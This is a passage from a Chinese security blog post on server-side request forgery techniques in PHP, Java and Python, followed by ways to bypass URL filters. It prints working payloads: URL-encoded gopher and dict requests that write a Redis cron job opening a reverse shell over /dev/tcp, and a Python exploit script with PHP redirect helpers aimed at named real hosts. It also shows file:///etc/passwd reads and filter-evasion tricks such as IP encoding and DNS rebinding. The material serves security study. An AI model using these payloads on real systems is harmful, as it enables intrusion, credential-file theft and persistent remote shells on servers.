0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&apos;</span><br></pre></td></tr></table></figure><p>当需要更换IP和端口时，命令中的<code>$57</code>需要同时更改，因为<code>$57</code>表示的是exp字符串长度为57个字节，上面的exp即<code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a</code>这段字符串URL解码后的长度为57。</p><p>这部分在下面的远程利用中会具体讲到。</p><h3 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h3><p>网上找的SSRF题目代码跑下就好。远程利用分为回显型和无回显型。</p><p>s1.php，未做任何SSRF防御，且有回显：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    <span class="comment">// 创建一个新cURL资源</span></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    <span class="comment">// 设置URL和相应的选项</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    <span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用exp，比较简单，就不贴图了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.137/s1.php?url=file:///etc/passwd</span><br><span class="line">http://192.168.10.137/s1.php?url=dict://127.0.0.1:6379/info</span><br><span class="line">http://192.168.10.137/s1.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a</span><br><span class="line"></span><br><span class="line"># Windows下file://协议有点区别</span><br><span class="line">http://192.168.10.137/s1.php?url=file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure><p>s2.php，限制协议为HTTP/HTTPS，且设置跳转重定向为True（默认不跳转）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">True</span>);</span><br><span class="line">    <span class="comment">// 限制为HTTPS、HTTP协议</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时使用dict、gopher等协议已经不能像上一个题目一样直接同理，但是还可以利用302跳转的方式来绕过http/https协议限制。</p><h4 id="Redis反弹Shell"><a href="#Redis反弹Shell" class="headerlink" title="Redis反弹Shell"></a>Redis反弹Shell</h4><p>Redis定时任务反弹shell语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h5 id="通过Gopher协议实现"><a href="#通过Gopher协议实现" class="headerlink" title="通过Gopher协议实现"></a>通过Gopher协议实现</h5><p>Gopher协议在SSRF利用中被广泛运用，其URL格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure><p>也就是说，通过Gopher协议，我们可以直接发送TCP协议流，从中进行urlencode编码来构造SSRF攻击代码。</p><p>具体Gopher协议报文的构造可参考Joychou的博客：<a href="https://joychou.org/web/phpssrf.html#directory0418754728965590855" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html#directory0418754728965590855</a></p><h5 id="通过Dict协议实现"><a href="#通过Dict协议实现" class="headerlink" title="通过Dict协议实现"></a>通过Dict协议实现</h5><p>这部分引用自：<a href="http://www.91ri.org/17111.html" target="_blank" rel="noopener">SSRF漏洞分析与利用</a></p><blockquote><p>dict协议有一个功能：dict://serverip:port/name:data 向服务器的端口请求 name data，并在末尾自动补上rn(CRLF)。也就是如果我们发出dict://serverip:port/config:set:dir:/var/spool/cron/的请求，redis就执行了config set dir /var/spool/cron/ rn.用这种方式可以一步步执行redis getshell的exp，执行完就能达到和gopher一样的效果。原理一样，但是gopher只需要一个url请求即可，dict需要步步构造。</p><p>利用猪猪侠的wooyun上公开的脚本改成适配本文的脚本ssrf.py：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">host = <span class="string">'104.224.151.234'</span></span><br><span class="line">port = <span class="string">'6379'</span></span><br><span class="line">bhost = <span class="string">'www.4o4notfound.org'</span></span><br><span class="line">bport=<span class="number">2333</span></span><br><span class="line">vul_httpurl = <span class="string">'http://www.4o4notfound.org/ssrf.php?url='</span></span><br><span class="line">_location = <span class="string">'http://www.4o4notfound.org/302.php'</span></span><br><span class="line">shell_location = <span class="string">'http://www.4o4notfound.org/shell.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1 flush db</span></span><br><span class="line">_payload = <span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=flushall'</span>.format( host = host,</span><br><span class="line"> port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#set crontab command</span></span><br><span class="line">_payload = <span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26bhost=&#123;bhost&#125;%26bport=</span></span><br><span class="line"><span class="string">&#123;bport&#125;'</span>.format( host = host, port = port, bhost = bhost, bport = bport)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(shell_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri </span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#confg set dir</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=</span></span><br><span class="line"><span class="string">&#123;port&#125;%26data=config:set:dir:/var/spool/cron/'</span>.format( host = host, port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#config set dbfilename</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=</span></span><br><span class="line"><span class="string">&#123;port&#125;%26data=config:set:dbfilename:root'</span>.format( host = host, port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#save</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=save'</span>.format( host = host, port</span><br><span class="line"> = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br></pre></td></tr></table></figure><blockquote><p>因为curl默认不支持302跳转，而该脚本要用到302跳转，所以需要在ssrf.php中加上一行“curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)”来支持跳转。302.php代码为：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$port = $_GET[<span class="string">'port'</span>];</span><br><span class="line">$scheme = $_GET[<span class="string">'s'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">header(<span class="string">"Location: $scheme://$ip:$port/$data"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>shell.php主要用于写入用于反弹shell的crontab的定时任务，代码为：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$port = $_GET[<span class="string">'port'</span>];</span><br><span class="line">$bhost = $_GET[<span class="string">'bhost'</span>];</span><br><span class="line">$bport = $_GET[<span class="string">'bport'</span>];</span><br><span class="line">$scheme = $_GET[<span class="string">'s'</span>];</span><br><span class="line">header(<span class="string">"Location: $scheme://$ip:$port/set:0:\"\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-</span></span><br><span class="line"><span class="string">i\\x20&amp;gt;\\x26\\x20/dev/tcp/&#123;$bhost&#125;/&#123;$bport&#125;\\x200&amp;gt;\\x261\\x0a\\x0a\\x0a\""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>执行ssrf.py,即可在/var/spool/cron/下写入定时任务，反弹shell，nc等待接收shell。</p></blockquote><h4 id="攻击本地PHP-FPM"><a href="#攻击本地PHP-FPM" class="headerlink" title="攻击本地PHP-FPM"></a>攻击本地PHP-FPM</h4><p>SSRF打本地PHP-FPM在之前的博文中有讲过：<a href="https://www.mi1k7ea.com/2019/08/25/%E6%B5%85%E8%B0%88PHP-FPM%E5%AE%89%E5%85%A8/#0x05-SSRF%E6%94%BB%E5%87%BB%E6%9C%AC%E5%9C%B0PHP-FPM">《浅谈PHP-FPM安全》</a></p><p>本次的Gopher协议攻击报文是直接通过脚本生成的。</p><h2 id="0x02-SSRF-in-Java"><a href="#0x02-SSRF-in-Java" class="headerlink" title="0x02 SSRF in Java"></a>0x02 SSRF in Java</h2><h3 id="可利用的协议-1"><a href="#可利用的协议-1" class="headerlink" title="可利用的协议"></a>可利用的协议</h3><p>由于Java没有PHP的cURL，因此不能像PHP一样可以通过<code>curl -V</code>来查看支持的协议，这里我们可以使用<code>import sun.net.www.protocol</code>来查看支持哪些协议：</p><p><img src="/2020/02/29/SSRF-Tricks小结/4.png" alt=""></p><p>可以看到是支持file、ftp、http/https、jar、mailto、netdoc等协议的。</p><p>而实际上有攻击利用价值的仅为file和http/https协议。</p><h3 id="SSRF相关类"><a href="#SSRF相关类" class="headerlink" title="SSRF相关类"></a>SSRF相关类</h3><p>Java中能发起网络请求的类：</p><ul><li>HttpClient类</li><li>HttpURLConnection类</li><li>URLConnection类</li><li>URL类</li><li>OkHttp类</li><li>ImageIO类</li><li>Request类</li></ul><p>注意：Request是对HttpClient类进行了封装的类，类似于Python的requests库。其用法简单，一行代码就能获取网页内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Request.Get(url).execute().returnContent().toString();</span><br></pre></td></tr></table></figure><p>其中，仅支持HTTP/HTTPS协议的类（即类名或封装的类名带http）：</p><ul><li>HttpClient类</li><li>HttpURLConnection类</li><li>OkHttp类</li><li>Request类</li></ul><p>支持<code>sun.net.www.protocol</code>所有协议的类：</p><ul><li>URLConnection类</li><li>URL类</li><li>ImageIO类</li></ul><h3 id="漏洞示例代码"><a href="#漏洞示例代码" class="headerlink" title="漏洞示例代码"></a>漏洞示例代码</h3><p>本部分引自：<a href="https://pplsec.github.io/2018/09/19/JAVA代码审计之XXE与SSRF/" target="_blank" rel="noopener">JAVA代码审计之XXE与SSRF</a></p><p>环境搭建可使用这个项目，这里就不演示了：<a href="https://github.com/pplsec/JavaVul/tree/master/MySSRF" target="_blank" rel="noopener">https://github.com/pplsec/JavaVul/tree/master/MySSRF</a></p><h4 id="HttpURLConnection类"><a href="#HttpURLConnection类" class="headerlink" title="HttpURLConnection类"></a>HttpURLConnection类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//HttpURLConnection ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line"> URLConnection urlConnection = u.openConnection();  </span><br><span class="line">HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;   </span><br><span class="line">BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(httpUrl.getInputStream())); <span class="comment">//发起请求,触发漏洞</span></span><br><span class="line">String inputLine;</span><br><span class="line"> StringBuffer html = <span class="keyword">new</span> StringBuffer(); </span><br><span class="line"></span><br><span class="line"> <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">         html.append(inputLine);</span><br><span class="line">        &#125;        </span><br><span class="line"> System.out.println(<span class="string">"html:"</span> + html.toString());</span><br><span class="line"> in.close();</span><br></pre></td></tr></table></figure><h4 id="URLConnection类"><a href="#URLConnection类" class="headerlink" title="URLConnection类"></a>URLConnection类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//urlConnection ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">URLConnection urlConnection = u.openConnection();</span><br><span class="line">BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(urlConnection.getInputStream())); <span class="comment">//发起请求,触发漏洞</span></span><br><span class="line">String inputLine;</span><br><span class="line">StringBuffer html = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"><span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">     html.append(inputLine);</span><br><span class="line">&#125;        </span><br><span class="line">System.out.println(<span class="string">"html:"</span> + html.toString());</span><br><span class="line">in.close();</span><br></pre></td></tr></table></figure><h4 id="ImageIO类"><a href="#ImageIO类" class="headerlink" title="ImageIO类"></a>ImageIO类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ImageIO ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">BufferedImage img = ImageIO.read(u); <span class="comment">// 发起请求,触发漏洞</span></span><br></pre></td></tr></table></figure><h4 id="其他类"><a href="#其他类" class="headerlink" title="其他类"></a>其他类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Request漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line"><span class="keyword">return</span> Request.Get(url).execute().returnContent().toString();<span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// openStream漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">inputStream = u.openStream();  <span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// OkHttpClient漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">com.squareup.okhttp.Request ok_http = <span class="keyword">new</span> com.squareup.okhttp.Request.Builder().url(url).build();</span><br><span class="line">client.newCall(ok_http).execute();  <span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// HttpClients漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">CloseableHttpClient client = HttpClients.createDefault();</span><br><span class="line">HttpGet httpGet = <span class="keyword">new</span> HttpGet(url);</span><br><span class="line">HttpResponse httpResponse = client.execute(httpGet); <span class="comment">//发起请求</span></span><br></pre></td></tr></table></figure><h3 id="特有jar-协议分析"><a href="#特有jar-协议分析" class="headerlink" title="特有jar://协议分析"></a>特有jar://协议分析</h3><p>jar://协议能从远程获取jar文件及解压得到其中的内容，其格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:&lt;url&gt;!/&#123;entry&#125;</span><br></pre></td></tr></table></figure><p>实例如下，<code>!</code>符号后面就是其需要从中解压出的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:http://a.com/b.jar!/file/within/the/zip</span><br></pre></td></tr></table></figure><p>jar://协议分类：</p><ul><li>Jar file（Jar包本身）：<code>jar:http://www.foo.com/bar/baz.jar!/</code></li><li>Jar entry（Jar包中某个资源文件）：<code>jar:http://www.foo.com/bar/baz.jar!/COM/foo/a.class</code></li><li>Jar directory（Jar包中某个目录）：<code>jar:http://www.foo.com/bar/baz.jar!/COM/foo/</code></li></ul><p>其实目前jar://协议在Java SSRF中的利用一般是获取目标jar包中的文件内容，比如某个类，其并不像其他常用的攻击协议一样能够对内网服务发起攻击。</p><p>比如下面的poc是获取目标jar包内C3P0.class文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/MySSRF/ssrf2?url=jar:http://127.0.0.1/ysoserial.jar!/ysoserial/payloads/C3P0.class</span><br></pre></td></tr></table></figure><p><img src="/2020/02/29/SSRF-Tricks小结/5.png" alt=""></p><p>这样就能看到jar包中的任何内容，如果jar包还是开发者自定义的话就会造成源码泄露，但是这个协议的利用还是很鸡肋。</p><h3 id="Weblogic-SSRF漏洞"><a href="#Weblogic-SSRF漏洞" class="headerlink" title="Weblogic SSRF漏洞"></a>Weblogic SSRF漏洞</h3><p>参考Vulhub的环境：<a href="https://vulhub.org/#/environments/weblogic/ssrf/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/ssrf/</a></p><h2 id="0x03-SSRF-in-Python"><a href="#0x03-SSRF-in-Python" class="headerlink" title="0x03 SSRF in Python"></a>0x03 SSRF in Python</h2><p>SSRF在Python中也是一样的，漏洞点都是发起URL请求的函数的参数外部可控导致SSRf漏洞。最为经典的就是和urllib的CRLF注入漏洞的结合利用，可参考：<a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p><h2 id="0x04-URL地址过滤Bypass"><a href="#0x04-URL地址过滤Bypass" class="headerlink" title="0x04 URL地址过滤Bypass"></a>0x04 URL地址过滤Bypass</h2><p>如今，大多数站点都对存在SSRF风险的地方的URL参数进行了过滤，但开发者的水平参差不齐，会存在一些可被绕过的场景。</p><h3 id="符绕过URL白名单"><a href="#符绕过URL白名单" class="headerlink" title="@符绕过URL白名单"></a>@符绕过URL白名单</h3><p>有时候后台程序会以白名单的方式校验输入的URL参数是否为白名单中的域名或IP，但如果只校验如是否以<code>http://a.com</code>开头，则可以通过<code>@</code>符进行绕过：<code>http://a.com@10.10.10.100</code></p><p>而此时实际访问的是<code>http://10.10.10.100</code>。</p><h3 id="IP地址进制转换绕过"><a href="#IP地址进制转换绕过" class="headerlink" title="IP地址进制转换绕过"></a>IP地址进制转换绕过</h3><p>通常，一些开发者会通过某些正则表达式来过滤掉内网地址，如：</p><ul><li><code>^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$</code></li><li><code>^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</code></li><li><code>^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</code></li></ul><p>此时我们可以对IP地址进行进制转换来绕过，例如192.168.0.1这个地址可以被改写成：</p><ul><li>8进制格式：0300.0250.0.1</li><li>16进制格式：0xC0.0xA8.0.1</li><li>16进制整数格式：0xC0A80001</li><li>10进制整数格式：3232235521（先转16进制正是格式再转回10进制整数形式）</li></ul><p>其他特殊形式：</p><ul><li>10.0.0.1可以写成10.1，访问改写后的IP地址时Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作；</li><li>0.0.0.0可以直接访问到本地；</li></ul><h3 id="通过xip-io解析到内网绕过"><a href="#通过xip-io解析到内网绕过" class="headerlink" title="通过xip.io解析到内网绕过"></a>通过xip.io解析到内网绕过</h3><p>这个就不用多介绍了，例如10.0.0.1这个内网IP地址是和以下几种形式的域名等价的：</p><ul><li>10.0.0.1.xip.io</li><li><a href="http://www.10.0.0.1.xip.io" target="_blank" rel="noopener">www.10.0.0.1.xip.io</a></li><li>mysite.10.0.0.1.xip.io</li><li>foo.bar.10.0.0.1.xip.io</li></ul><h3 id="利用IPv6绕过"><a href="#利用IPv6绕过" class="headerlink" title="利用IPv6绕过"></a>利用IPv6绕过</h3><blockquote><p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::]</code> <code>0000::1</code>或IPv6的内网域名来绕过过滤。</p></blockquote><h3 id="利用IDN绕过"><a href="#利用IDN绕过" class="headerlink" title="利用IDN绕过"></a>利用IDN绕过</h3><blockquote><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p><p>在这些字符中，部分字符会在访问时做一个等价转换，例如 <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code> 和 <code>example.com</code> 等同。利用这种方式，可以用 <code>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩</code> 等字符绕过内网限制。</p></blockquote><h3 id="利用30x跳转绕过"><a href="#利用30x跳转绕过" class="headerlink" title="利用30x跳转绕过"></a>利用30x跳转绕过</h3><blockquote><p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。</p><p>可以使用如 <a href="http://httpbin.org/redirect-to?url=http://192.168.0.1" target="_blank" rel="noopener">http://httpbin.org/redirect-to?url=http://192.168.0.1</a> 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。</p><p>常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。</p></blockquote><p>跳转常见的结合协议的方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: file://etc/passwd"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: dict://127.0.0.1:666/info"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: gopher://127.0.0.1:666/_info"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>DNS Rebinding可以利用于绕过SSRF以及绕过同源策略等。</p><p>这里看下利用DNS Rebinding绕过SSRF过滤URL参数的场景，有如下三种方法。</p><h4 